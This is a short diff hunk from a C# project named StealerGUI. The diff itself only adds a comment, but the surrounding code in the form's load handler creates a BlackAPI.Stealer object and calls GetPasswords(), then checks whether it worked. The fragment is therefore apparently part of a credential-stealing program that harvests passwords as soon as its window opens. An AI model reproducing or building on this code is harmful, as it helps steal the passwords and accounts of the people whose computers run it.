@@ -19,6 +19,7 @@ namespace StealerGUI
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            // 1
             BlackAPI.Stealer stealer = new BlackAPI.Stealer();
             var stealerresult = stealer.GetPasswords();
             if (stealerresult.Work)
